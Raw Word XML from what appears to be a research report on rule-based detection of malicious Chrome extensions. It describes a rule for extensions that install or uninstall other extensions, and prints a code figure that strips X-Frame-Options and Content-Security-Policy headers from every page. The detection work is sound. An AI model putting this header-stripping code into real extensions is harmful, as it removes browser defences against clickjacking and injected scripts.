                        <w:t xml:space="preserve">      </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>failureCallback</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>)</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="CC7832"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t xml:space="preserve">   </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:t>}</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00581271">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="22"/>
                          <w:szCs w:val="22"/>
                        </w:rPr>
                        <w:br/>
                        <w:t>}</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2B7AF82B" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="00655814" w:rsidRDefault="006A6E3D" w:rsidP="00BB69E8">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="168F604E" w14:textId="3A91D352" w:rsidR="006A6E3D" w:rsidRPr="00655814" w:rsidRDefault="006A6E3D">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="18"/>
                          <w:szCs w:val="18"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00F66EC0" w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>Rule 3: Extension installation/uninstallation.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="161"/>
    </w:p>
    <w:p w14:paraId="519765DB" w14:textId="1DF81BA7" w:rsidR="001175B2" w:rsidRPr="009E02A4" w:rsidRDefault="009E02A4" w:rsidP="009E02A4">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="162" w:name="_Ref514844029"/>
      <w:bookmarkStart w:id="163" w:name="_Toc523071581"/>
      <w:r w:rsidRPr="009E02A4">
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:instrText xml:space="preserve"> SEQ Figure \* ARABIC </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="006A6E3D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="009E02A4">
        <w:t>: Extension installation/uninstallation.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="162"/>
      <w:bookmarkEnd w:id="163"/>
    </w:p>
    <w:p w14:paraId="382B71C1" w14:textId="02F9E16C" w:rsidR="00F66EC0" w:rsidRPr="00F66EC0" w:rsidDel="00334F3E" w:rsidRDefault="00F66EC0" w:rsidP="001175B2">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:del w:id="164" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z"/>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">This rule detects whether the extension installs or uninstalls other extensions. For the extension installation the </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA79D4">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="165" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.webstore.install</w:t>
      </w:r>
      <w:ins w:id="166" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z">
        <w:r w:rsidR="00FA79D4">
          <w:rPr>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA79D4">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="167" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA79D4">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="168" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>successCallback</w:t>
      </w:r>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>, f</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA79D4">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="169" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>ailureCallback</w:t>
      </w:r>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">) function is used (as we can see in the above </w:t>
      </w:r>
      <w:r w:rsidR="009A4787">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>figure</w:t>
      </w:r>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t xml:space="preserve">) whereas, for the extension uninstallation the function used is </w:t>
      </w:r>
      <w:r w:rsidRPr="00FA79D4">
        <w:rPr>
          <w:i/>
          <w:lang w:bidi="he-IL"/>
          <w:rPrChange w:id="170" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z">
            <w:rPr>
              <w:lang w:bidi="he-IL"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>chrome.management.unistall(id)</w:t>
      </w:r>
      <w:r w:rsidRPr="00F66EC0">
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B7C1DE" w14:textId="77777777" w:rsidR="00F66EC0" w:rsidRPr="00F66EC0" w:rsidRDefault="00F66EC0" w:rsidP="00334F3E">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
        <w:pPrChange w:id="171" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:43:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
    </w:p>
    <w:bookmarkStart w:id="172" w:name="_Toc523071517"/>
    <w:p w14:paraId="259549CD" w14:textId="1ADBAD36" w:rsidR="001175B2" w:rsidRDefault="00655814" w:rsidP="00F66EC0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:bidi="he-IL"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251665408" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="125725B1" wp14:editId="478AD63B">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>left</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>418465</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="5972175" cy="252412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2524125"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="9525">
                          <a:noFill/>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="696A2BB7" w14:textId="41D6210A" w:rsidR="006A6E3D" w:rsidRPr="00CA131F" w:rsidRDefault="006A6E3D" w:rsidP="00655814">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>chrome[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"webRequest"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>][</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"onHeadersReceived"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>][</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"addListener"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>](</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>function</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>(e) {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">    var </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>t = e[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"responseHeaders"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>]</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>for</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">var </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>n = t[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"length"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>]-</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6897BB"/>
                              </w:rPr>
                              <w:t>1</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">; </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>n&gt;=</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6897BB"/>
                              </w:rPr>
                              <w:t>0</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">; </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>--n) {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">        </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">var </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>r = t[n][</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"name"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>][</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"toLowerCase"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>]()</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">        </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>if</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t xml:space="preserve">(r == </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t xml:space="preserve">"X-frame-options" </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t xml:space="preserve">|| r == </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t xml:space="preserve">"Frame-options" </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t xml:space="preserve">|| </w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0B545378" w14:textId="3CAE07AA" w:rsidR="006A6E3D" w:rsidRPr="00CA131F" w:rsidRDefault="006A6E3D" w:rsidP="00655814">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t xml:space="preserve">        r == </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t xml:space="preserve">"Content-security-policy" </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t xml:space="preserve">|| r == </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t xml:space="preserve">"X-content-security-policy" </w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">        </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>||</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t xml:space="preserve">r == </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"X-webkit-csp"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>) {</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">            t[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"splice"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>](n</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6897BB"/>
                              </w:rPr>
                              <w:t>1</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>)</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">        </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    }</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:b/>
                                <w:bCs/>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">return </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>{</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">      </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                              </w:rPr>
                              <w:t>responseHeaders</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>: t</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">    }</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>{</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t xml:space="preserve">   </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="9876AA"/>
                              </w:rPr>
                              <w:t>urls</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>: [</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"*://*/*"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>]</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:br/>
                              <w:t>}</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>[</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="6A8759"/>
                              </w:rPr>
                              <w:t>"blocking"</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t xml:space="preserve">, </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                              <w:t>responseHeaders])</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CA131F">
                              <w:rPr>
                                <w:color w:val="CC7832"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="18B66AAD" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="00CA131F" w:rsidRDefault="006A6E3D" w:rsidP="00655814">
                            <w:pPr>
                              <w:pStyle w:val="HTMLPreformatted"/>
                              <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                              <w:rPr>
                                <w:color w:val="A9B7C6"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="76E91A80" w14:textId="77777777" w:rsidR="006A6E3D" w:rsidRPr="00CA131F" w:rsidRDefault="006A6E3D">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5725B1" id="_x0000_s1033" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:32.95pt;width:470.25pt;height:198.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" filled="f" stroked="f">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="696A2BB7" w14:textId="41D6210A" w:rsidR="006A6E3D" w:rsidRPr="00CA131F" w:rsidRDefault="006A6E3D" w:rsidP="00655814">
                      <w:pPr>
                        <w:pStyle w:val="HTMLPreformatted"/>
                        <w:shd w:val="clear" w:color="auto" w:fill="2B2B2B"/>
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>chrome[</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"webRequest</w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>][</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"onHeadersReceived"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>][</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="6A8759"/>
                        </w:rPr>
                        <w:t>"addListener"</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>](</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t>function</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>(e) {</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:br/>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:b/>
                          <w:bCs/>
                          <w:color w:val="CC7832"/>
                        </w:rPr>
                        <w:t xml:space="preserve">    var </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CA131F">
                        <w:rPr>
                          <w:color w:val="A9B7C6"/>
                        </w:rPr>
                        <w:t>t = e[</w:t>
                      </w:r>
